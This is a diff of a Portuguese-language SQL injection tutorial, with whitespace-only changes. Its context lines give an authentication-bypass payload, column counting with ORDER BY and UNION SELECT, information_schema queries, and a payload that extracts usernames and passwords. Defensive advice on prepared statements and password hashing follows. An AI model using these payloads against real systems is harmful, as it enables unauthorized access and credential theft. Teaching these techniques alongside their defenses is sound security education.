@@ -52,6 +52,7 @@ Payload básico para verificar SQL Injection:
 sql
 
 ' OR '1'='1
+
 Se o login for bem-sucedido sem credenciais válidas, o sistema é vulnerável.
 
 Exemplo de query resultante:
@@ -71,6 +72,7 @@ sql
 ' ORDER BY 2--  
 ' ORDER BY 3--  
 ...  
+
 Exemplo:
 
 Se ORDER BY 5 funcionar, mas ORDER BY 6 der erro → 5 é o número de colunas.
@@ -82,11 +84,13 @@ Payload genérico (substitua X pelo nº de colunas):
 sql
 
 ' UNION SELECT 1,2,3,...,X--  
+
 Exemplo para 4 colunas:
 
 sql
 
 ' UNION SELECT 1,2,3,4--  
+
 O que observar:
 
 Se aparecerem números na tela (ex: 2 e 3), essas são colunas visíveis (úteis para extrair dados).
@@ -98,6 +102,7 @@ Payload para listar tabelas:
 sql
 
 ' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema = database()--  
+
 Resultado esperado:
 
 Nomes de tabelas como usuarios, clientes, produtos, etc.
@@ -109,6 +114,7 @@ Payload para listar colunas:
 sql
 
 ' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name = 'usuarios'--  
+
 Resultado esperado:
 
 Colunas como id, username, password, email, etc.
@@ -120,6 +126,7 @@ Payload para extrair usuários e senhas:
 sql
 
 ' UNION SELECT 1,username,password,4 FROM usuarios--  
+
 Se as senhas estiverem em texto puro:
 → Aparecerão diretamente.
 
@@ -133,12 +140,14 @@ php
 
 $stmt = $pdo->prepare("SELECT * FROM usuarios WHERE username = ? AND password = ?");
 $stmt->execute([$username, $password]);
+
 Armazene senhas com hash (ex: password_hash() + password_verify())
 
 Valide entradas (filtros, regex, escape de caracteres)
 
 📌 Conclusão
 Este tutorial mostrou como:
+
 1️⃣ Testar vulnerabilidade (' OR '1'='1)
 2️⃣ Descobrir colunas (ORDER BY e UNION SELECT)
 3️⃣ Extrair tabelas e colunas (information_schema)
